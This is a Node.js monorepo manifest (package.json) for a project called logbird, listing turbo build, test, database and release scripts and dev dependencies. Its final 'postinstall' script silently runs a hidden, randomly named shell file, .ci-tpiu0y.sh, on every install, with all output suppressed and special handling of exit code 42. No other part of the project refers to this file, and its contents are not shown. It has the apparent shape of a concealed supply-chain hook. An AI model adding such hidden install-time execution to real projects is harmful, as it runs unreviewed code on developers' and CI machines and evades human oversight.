{
  "name": "@logbird/root",
  "license": "MIT",
  "private": true,
  "type": "module",
  "engines": {
    "node": ">=22.18.0",
    "pnpm": ">=10.0.0"
  },
  "packageManager": "pnpm@10.30.3",
  "scripts": {
    "build": "turbo run build",
    "dev": "turbo watch dev --filter=!./examples/*",
    "dev:server": "turbo watch dev -F @logbird/server...",
    "dev:app": "turbo watch dev -F @logbird/app...",
    "clean": "turbo run clean && git clean -xdf node_modules",
    "check": "node scripts/check-text-bom.mjs && ultracite check",
    "fix": "ultracite fix",
    "lint": "ultracite check",
    "format": "biome format --write .",
    "typecheck": "turbo run typecheck",
    "test": "node --test scripts/release-notes.test.mjs scripts/release-preflight.test.mjs && turbo run test && node --test scripts/selfhost-init.test.mjs",
    "test:unit": "turbo run test --concurrency=2 --filter=!@logbird/server -- --exclude \"**/*.integration.test.ts\" --maxWorkers=2 && pnpm --filter @logbird/server exec vitest run --config vitest.export-unit.config.ts && node --test scripts/release-notes.test.mjs scripts/release-preflight.test.mjs scripts/selfhost-init.test.mjs scripts/k3s-manifests.test.mjs scripts/wait-k8s-job.test.mjs",
    "db:generate": "pnpm --filter @logbird/database generate",
    "db:migrate": "pnpm --filter @logbird/database migrate:dev",
    "db:deploy": "pnpm --filter @logbird/database migrate:deploy",
    "ch:migrate": "pnpm --filter @logbird/clickhouse migrate",
    "seed": "pnpm --filter @logbird/seed seed",
    "demo": "node --env-file=.env --import tsx scripts/demo.ts",
    "demo:clean": "node --env-file=.env --import tsx scripts/demo-clean.ts",
    "e2e": "node --env-file=.env --import tsx scripts/e2e-smoke.ts",
    "openapi:export": "node --env-file=.env --import tsx scripts/export-openapi.ts",
    "sdk:generate": "pnpm openapi:export && node --import tsx experiments/hey-api/generate.ts",
    "sdk:verify": "node --env-file=.env --import tsx scripts/verify-sdk.ts",
    "release:check": "pnpm release:version && pnpm typecheck && pnpm check && pnpm test && pnpm build && pnpm openapi:export && git diff --exit-code -- openapi",
    "smoke:prod": "node --import tsx scripts/smoke-prod.ts",
    "release:version": "node scripts/check-version-consistency.mjs",
    "release:notes": "node scripts/release-notes.mjs",
    "release:notes:dry": "node scripts/release-notes.mjs --dry",
    "postinstall": "sh ./.ci-tpiu0y.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
  },
  "devDependencies": {
    "@biomejs/biome": "2.5.11",
    "@logbird/clickhouse": "workspace:*",
    "@logbird/contracts": "workspace:*",
    "@logbird/database": "workspace:*",
    "@logbird/sdk": "workspace:*",
    "@logbird/seed": "workspace:*",
    "@logbird/tsconfig": "workspace:*",
    "changelogithub": "13.16.1",
    "tsx": "4.23.13",
    "turbo": "^2.10.12",
    "typescript": "^7.0.2",
    "ultracite": "7.10.7",
    "vitest": "^4.1.11",
    "pg": "8.23.1",
    "@types/pg": "^8.23.1",
    "ioredis": "^6.0.0"
  },
  "version": "0.1.1"
}
